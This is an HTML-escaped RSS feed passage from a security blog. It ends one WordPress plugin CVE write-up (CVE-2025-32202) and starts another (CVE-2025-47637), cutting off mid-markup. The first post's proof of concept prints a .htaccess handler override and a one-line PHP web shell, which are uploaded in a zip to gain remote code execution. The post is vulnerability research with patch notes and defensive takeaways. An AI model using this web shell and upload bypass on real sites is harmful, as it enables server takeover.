(HTML)&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;getFile()&lt;/code&gt; locates the main HTML file (the Articulate content entrypoint).&lt;/li&gt;&#xA;&lt;li&gt;Check the status of the found HTML file.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $file[&amp;#39;status&amp;#39;] == &amp;#39;valid_html_file_found&amp;#39; || ...) {&#xA;    $arr[4] = 1; // OK = 1&#xA;} elseif ( $file[&amp;#39;status&amp;#39;] == &amp;#39;no_html_file_found&amp;#39; ) {&#xA;    articulate_rrmdir( $target ); // Remove directory if no HTML found&#xA;    $arr[4] = 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Return result information&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$arr[1] = getUploadsUrl() . $dir . &amp;#39;/&amp;#39; . $file[&amp;#39;file_name&amp;#39;];&#xA;$arr[2] = $dir;&#xA;$arr[3] = $file;&#xA;return $arr;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;$arr&lt;/code&gt; contains information such as:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[0]&lt;/code&gt;: message&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[1]&lt;/code&gt;: file URL&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[2]&lt;/code&gt;: directory&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[3]&lt;/code&gt;: file detail info&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[4]&lt;/code&gt;: success/failure status (OK)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;POST /wp-admin/admin-ajax.php?action=articulate_upload_file&amp;#34;] --&amp;gt; B[&amp;#34;articulate_upload_ajax_file()&amp;#34;]&#xA;B --&amp;gt; C{&amp;#34;check_ajax_referer(&amp;#39;articulate_upload_file&amp;#39;) valid?&amp;#34;}&#xA;C -- No --&amp;gt; Z[&amp;#34;Return JSON error&amp;#34;]&#xA;C -- Yes --&amp;gt; D{&amp;#34;User has &amp;#39;upload_files&amp;#39; &amp;amp;&amp;amp; &amp;#39;unfiltered_html&amp;#39;?&amp;#34;}&#xA;D -- No --&amp;gt; Z&#xA;D -- Yes --&amp;gt; E[&amp;#34;Handle uploaded file → save to {$filePath}.part&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Combine chunks &amp;amp; rename → articulate_custom_rename(&amp;#39;{$filePath}.part&amp;#39;, $filePath)&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;extractZip($filePath, $target, $dir)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Quiz_Unzip-&amp;gt;unzip_file($filePath, $target)&amp;#34;]&#xA;H --&amp;gt; I{&amp;#34;articulate_has_php_file($target) detect .php/.phtml/.phar ?&amp;#34;}&#xA;I -- Yes --&amp;gt; J[&amp;#34;articulate_rrmdir($target) → delete folder → return error&amp;#34;]&#xA;I -- No --&amp;gt; K[&amp;#34;(❌ Missing check for .htaccess file)&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Attacker uploads ZIP containing .htaccess&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;.htaccess overrides Apache handler in upload dir&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;→ Arbitrary File Upload → Remote Code Execution (RCE)&amp;#34;]&#xA;&#xA;%% Patch branch&#xA;K --&amp;gt; P[&amp;#34;✅ [Patched] articulate_has_php_file() adds &amp;#39;.htaccess&amp;#39; check&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Upload blocked if .htaccess detected&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create the following directory structure:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;bypass&#xA;.&#xA;├── .htaccess&#xA;├── index.html&#xA;└── rce.abc&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;.htaccess&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;IfModule mod_php.c&amp;gt;&#xA;    &amp;lt;Files &amp;#34;*.abc&amp;#34;&amp;gt;&#xA;        SetHandler application/x-httpd-php&#xA;    &amp;lt;/Files&amp;gt;&#xA;&amp;lt;/IfModule&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Create a rule so that files with &lt;code&gt;.abc&lt;/code&gt; in the current directory and subdirectories can be uploaded and will be executed as &lt;code&gt;.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;rce.abc&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Contains a web shell&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]) ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Zip the folder&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;zip -r bypass.zip bypass&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Upload the created zip file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/widget.png&#34; title=&#34;Plugin widget in post creation&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/widget.png&#34; data-sub-html=&#34;&lt;h2&gt;e-Elearning&lt;/h2&gt;&lt;p&gt;Plugin widget in post creation&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/widget.png&#39; alt=&#34;e-Elearning&#34; height=&#34;542&#34; width=&#34;1401&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Plugin widget in post creation&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;This is the feature described in the plugin documentation: we create a post, add this widget, then perform the zip file upload.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/block.png&#34; title=&#34;e-Elearning widget&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/block.png&#34; data-sub-html=&#34;&lt;h2&gt;Block&lt;/h2&gt;&lt;p&gt;e-Elearning widget&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/block.png&#39; alt=&#34;Block&#34; height=&#34;189&#34; width=&#34;348&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;e-Elearning widget&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Request and Response in BurpSuite:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/re_rs.png&#34; title=&#34;Request and Response in BurpSuite&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/re_rs.png&#34; data-sub-html=&#34;&lt;h2&gt;Request and Response in BurpSuite&lt;/h2&gt;&lt;p&gt;Request and Response in BurpSuite&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/re_rs.png&#39; alt=&#34;Request and Response in BurpSuite&#34; height=&#34;580&#34; width=&#34;1895&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request and Response in BurpSuite&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;RCE with web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/result.png&#34; title=&#34;RCE via file upload&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE via file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/result.png&#39; alt=&#34;Result&#34; height=&#34;580&#34; width=&#34;1305&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE via file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-32202&lt;/strong&gt; vulnerability arises because the &lt;strong&gt;Insert or Embed Articulate Content into WordPress&lt;/strong&gt; plugin does not sufficiently check the types of files inside extracted archives, omitting the case of &lt;code&gt;.htaccess&lt;/code&gt;. This allows an attacker with &lt;strong&gt;Editor&lt;/strong&gt; privileges to upload a &lt;code&gt;.htaccess&lt;/code&gt; file to override handlers in the uploads directory. As a result, later uploaded files, even with arbitrary extensions (like &lt;code&gt;.abc&lt;/code&gt;, &lt;code&gt;.xyz&lt;/code&gt;), can be treated as PHP, leading to &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&#xA;The &lt;strong&gt;4.3000000026&lt;/strong&gt; patch added a check for &lt;code&gt;.htaccess&lt;/code&gt;, preventing handler override in the uploads directory and eliminating this exploitation vector.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Rigorously check all file types that can affect server behavior, especially &lt;code&gt;.htaccess&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Don&amp;rsquo;t rely only on file extensions; validate both MIME type and actual file content.&lt;/li&gt;&#xA;&lt;li&gt;Do not allow users — even those with Editor privileges — to upload archives that can contain executable content.&lt;/li&gt;&#xA;&lt;li&gt;Clearly separate user upload directories from directories where PHP can be executed.&lt;/li&gt;&#xA;&lt;li&gt;Regularly audit and update plugins; small filtering mistakes can lead to severe RCE.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/insert-or-embed-articulate-content-into-wordpress/vulnerability/wordpress-insert-or-embed-articulate-content-into-wordpress-plugin-4-3000000025-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Insert or Embed Articulate Content into WordPress Plugin &amp;lt;= 4.3000000025 is vulnerable to Arbitrary File Upload &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-47637 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-11-cve-2025-47637/</link>
      <pubDate>Tue, 11 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-11-cve-2025-47637/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; vulnerability in the &lt;strong&gt;STAGGS&lt;/strong&gt; plugin allows an attacker to upload a &lt;strong&gt;Web Shell&lt;/strong&gt; to the web server, affecting &lt;strong&gt;STAGGS versions from n/a to 2.11.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-47637&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-47637&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.11.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.12.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/staggs/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress STAGGS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;STAGGS&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.11.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.12.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability occurs in the function &lt;code&gt;store_final_product_image()&lt;/code&gt; in the file &lt;code&gt;/wp-content/plugins/staggs/includes/staggs-functions.php&lt;/code&gt; due to not validating the &lt;strong&gt;file type&lt;/strong&gt; before upload.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/diff.png&#34; title=&#34;File type validation&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Validate File Type&lt;/h2&gt;&lt;p&gt;File type validation&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/diff.png&#39; alt=&#34;Validate File Type&#34; height=&#34;1200&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;File type validation&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch used a whitelist, accepting only the file types: &lt;code&gt;png&lt;/code&gt;,&lt;code&gt;jpg&lt;/code&gt;,&lt;code&gt;jpeg&lt;/code&gt;,&lt;code&gt;gif&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 